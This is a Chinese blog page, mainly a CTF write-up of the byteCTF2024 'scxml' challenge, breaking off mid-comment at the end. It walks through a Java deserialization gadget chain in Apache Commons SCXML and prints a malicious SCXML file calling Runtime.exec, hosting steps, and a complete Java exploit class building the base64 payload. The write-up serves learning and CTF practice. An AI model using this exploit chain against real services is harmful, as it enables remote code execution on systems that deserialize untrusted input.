<p>去营造那不存在的暖风</p>
<p>脚下却只能踩着水坑</p>
</blockquote>
<p>霍乱时期的毕业；</p>
<blockquote>
<p>我为你保留了童贞可不是一场梦</p>
</blockquote>
<p>我原以为什么，但什么，什么，什么，反倒显得什么什么了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/19/2024-09-19-byteCTF2024-scxml/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/19/2024-09-19-byteCTF2024-scxml/" class="post-title-link" itemprop="url">byteCTF2024-scxml</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-09-19 00:00:00 / Modified: 10:54:08" itemprop="dateCreated datePublished" datetime="2024-09-19T00:00:00+08:00">2024-09-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="byteCTF2024-scxml"><a href="#byteCTF2024-scxml" class="headerlink" title="byteCTF2024-scxml"></a>byteCTF2024-scxml</h1><p>入门代码审计，有一些比较；</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(System.getenv().getOrDefault(<span class="string">&quot;PORT&quot;</span>, <span class="string">&quot;8000&quot;</span>));</span><br><span class="line">        <span class="type">var</span> <span class="variable">server</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">java</span>.net.InetSocketAddress(port), <span class="number">0</span>);</span><br><span class="line">        server.createContext(<span class="string">&quot;/&quot;</span>, req -&gt; &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">code</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line">            <span class="type">var</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">switch</span> (req.getRequestURI().getPath()) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;/scxml&quot;</span> -&gt; &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">var</span> <span class="variable">param</span> <span class="operator">=</span> req.getRequestURI().getQuery();</span><br><span class="line">                        <span class="keyword">yield</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(<span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(param))).readObject().toString();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                        <span class="keyword">yield</span> <span class="string">&quot;:(&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">default</span> -&gt; &#123;</span><br><span class="line">                    code = <span class="number">404</span>;</span><br><span class="line">                    <span class="keyword">yield</span> <span class="string">&quot;Not found&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            req.sendResponseHeaders(code, <span class="number">0</span>);</span><br><span class="line">            <span class="type">var</span> <span class="variable">os</span> <span class="operator">=</span> req.getResponseBody();</span><br><span class="line">            os.write(response.getBytes());</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;);</span><br><span class="line">        server.start();</span><br><span class="line">        System.out.printf(<span class="string">&quot;Server listening on :%s\n&quot;</span>, port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把你传进去的任何 base64 解码之后进行反序列化；</p>
<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><p>四个依赖：</p>
<p><img src="https://i.imgur.com/XnOoKpE.png"></p>
<p><code>com.n1ght</code> 是出题人留的一定会用，还给了 <a target="_blank" rel="noopener" href="https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/">hint</a> 是一个链接，内容是 commons scxml 这个依赖的一种打法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copied by QST on https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.ModelException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.stream.XMLStreamException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SCXMLDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ModelException, XMLStreamException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// engine to execute the scxml instance</span></span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="comment">// parse SCXML URL into SCXML model</span></span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(<span class="string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set state machine (scxml instance) to execute</span></span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好吧也不能算是打法，只是告诉你这个东西能执行远程代码，还需要起 http 服务挂一个 xml：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;open -a calculator&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接找链子即可，入口点给的很明显了，在 <code>com.n1ght.InvokerImpl</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerImpl</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Invoker o;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String source;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map params;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerImpl</span><span class="params">(Invoker o, String source, Map params)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.o = o;</span><br><span class="line">        <span class="built_in">this</span>.source = source;</span><br><span class="line">        <span class="built_in">this</span>.params = params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.o.invoke(<span class="built_in">this</span>.source, <span class="built_in">this</span>.params);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success invoke&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvokerException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里重写的 <code>toString()</code> 结合 Main.java 的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream(<span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(param))).readObject().toString()</span><br></pre></td></tr></table></figure>

<p>很适合作为反序列化的入口点，往下触发 <code>o.invoke()</code> ，进 <code>Invoker</code> ，只有 <code>SimpleSCXMLInvoker</code> 一个实现，看一下 <code>Invoker#invoke()</code> 这个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">   <span class="keyword">private</span> String parentStateId;</span><br><span class="line">   <span class="keyword">private</span> String eventPrefix;</span><br><span class="line">   <span class="keyword">private</span> SCInstance parentSCInstance;</span><br><span class="line">   <span class="keyword">private</span> SCXMLExecutor executor;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">boolean</span> cancelled;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">invokePrefix</span> <span class="operator">=</span> <span class="string">&quot;.invoke.&quot;</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">invokeDone</span> <span class="operator">=</span> <span class="string">&quot;done&quot;</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">invokeCancelResponse</span> <span class="operator">=</span> <span class="string">&quot;cancel.response&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">SimpleSCXMLInvoker</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(String source, Map&lt;String, Object&gt; params)</span> <span class="keyword">throws</span> InvokerException &#123;</span><br><span class="line">       <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           scxml = SCXMLReader.read(<span class="keyword">new</span> <span class="title class_">URL</span>(source));</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ModelException var9) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvokerException</span>(var9.getMessage(), var9.getCause());</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException var10) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvokerException</span>(var10.getMessage(), var10.getCause());</span><br><span class="line">       &#125; <span class="keyword">catch</span> (XMLStreamException var11) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvokerException</span>(var11.getMessage(), var11.getCause());</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">Evaluator</span> <span class="variable">eval</span> <span class="operator">=</span> <span class="built_in">this</span>.parentSCInstance.getEvaluator();</span><br><span class="line">       <span class="built_in">this</span>.executor = <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>(eval, <span class="keyword">new</span> <span class="title class_">SimpleDispatcher</span>(), <span class="keyword">new</span> <span class="title class_">SimpleErrorReporter</span>());</span><br><span class="line">       <span class="type">Context</span> <span class="variable">rootCtx</span> <span class="operator">=</span> eval.newContext((Context)<span class="literal">null</span>);</span><br><span class="line">       <span class="type">Iterator</span> <span class="variable">var6</span> <span class="operator">=</span> params.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span>(var6.hasNext()) &#123;</span><br><span class="line">           Map.Entry&lt;String, Object&gt; entry = (Map.Entry)var6.next();</span><br><span class="line">           rootCtx.setLocal((String)entry.getKey(), entry.getValue());</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">this</span>.executor.setRootContext(rootCtx);</span><br><span class="line">       <span class="built_in">this</span>.executor.setStateMachine(scxml);</span><br><span class="line">       <span class="built_in">this</span>.executor.addListener(scxml, <span class="keyword">new</span> <span class="title class_">SimpleSCXMLListener</span>());</span><br><span class="line">       <span class="built_in">this</span>.executor.registerInvokerClass(<span class="string">&quot;scxml&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="built_in">this</span>.executor.go();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ModelException var8) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvokerException</span>(var8.getMessage(), var8.getCause());</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="built_in">this</span>.executor.getCurrentStatus().isFinal()) &#123;</span><br><span class="line">           <span class="type">TriggerEvent</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TriggerEvent</span>(<span class="built_in">this</span>.eventPrefix + invokeDone, <span class="number">3</span>);</span><br><span class="line">           (<span class="keyword">new</span> <span class="title class_">AsyncTrigger</span>(<span class="built_in">this</span>.parentSCInstance.getExecutor(), te)).start();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>结合 hint 容易知道 <code>this.executor.go()</code> 能执行参数 <code>source</code> 里 <code>&lt;script&gt;</code> 包含的 Java 代码（<a target="_blank" rel="noopener" href="https://ridikuius.github.io/Apache-Commons-JEXL3-%E8%AF%AD%E6%B3%95/">JEXL 短表达式</a>），但创建出来这个类里很多属性默认是 <code>null</code>，需要动手设置一下；</p>
<p>这里 <code>executor</code> 直到 <code>this.executor.go()</code> 之前调用了 <code>this.parentSCInstance.getEvaluator()</code>，这提出了四点要求：</p>
<ol>
<li>实例化一个 <code>SCXMLExecutor</code> ，进而实例化一个 <code>SCInstance</code>；</li>
<li>实例化一个 <code>Evaluator</code>；</li>
<li>设置 <code>this.parentSCInstance</code> 为实例化出来的 <code>SCInstance</code>；</li>
<li><code>this.parentSCInstance.setEvaluator()</code>；</li>
</ol>
<p>其中，<code>SCInstance(Executor)</code>  为 <code>protected</code> 构造方法，exp 中需要反射调用；</p>
<p><code>this.parentSCInstance.setEvaluator()</code> 也为 <code>protected</code> 方法，也需要反射调用；</p>
<p><code>Evaluator</code> 有好四种，根据 <code>&lt;script&gt;</code> 执行的语句为 Java 判断传入 <code>JexlEvaluator</code>，事实上别的类也用不了；</p>
<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>首先将恶意的 xml 挂在一个  http 服务上，我使用简单的 httpd 起镜像：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run <span class="literal">-d</span> <span class="literal">-p</span> <span class="number">8081</span>:<span class="number">80</span> httpd:<span class="number">2.4</span>.<span class="number">62</span><span class="literal">-bookworm</span></span><br></pre></td></tr></table></figure>

<p>进入文件系统将 <code>/usr/local/apache2/htdocs/index.html</code> 改为 exp xml 内容：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行完整 payload：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.n1ght.InvokerImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.Evaluator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCInstance;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.env.jexl.JexlEvaluator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.invoke.SimpleSCXMLInvoker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * expolit scxml</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> qst137</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">Exploit</span>().getPayload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// create SCInstance object</span></span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">scxmlExecutor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">scInstanceConstructor</span> <span class="operator">=</span> SCInstance.class.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        scInstanceConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">SCInstance</span> <span class="variable">scInstance</span> <span class="operator">=</span> (SCInstance) scInstanceConstructor.newInstance(scxmlExecutor);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// set Evaluator of SCInstance</span></span><br><span class="line">        <span class="type">JexlEvaluator</span> <span class="variable">jexlEvaluator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JexlEvaluator</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">setEvalMethod</span> <span class="operator">=</span> SCInstance.class.getDeclaredMethod(<span class="string">&quot;setEvaluator&quot;</span>, Evaluator.class);</span><br><span class="line">        setEvalMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        setEvalMethod.invoke(scInstance, jexlEvaluator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// create Invoker, set SCInstance and create InvokerImpl (entrypoint)</span></span><br><span class="line">        <span class="type">SimpleSCXMLInvoker</span> <span class="variable">invoker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleSCXMLInvoker</span>();</span><br><span class="line">        invoker.setSCInstance(scInstance);</span><br><span class="line">        <span class="comment">// empty params map</span></span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">InvokerImpl</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerImpl</span>(invoker, <span class="string">&quot;http://localhost:8081/&quot;</span>, map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// output base64 payload</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        ois.writeObject(payload);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span 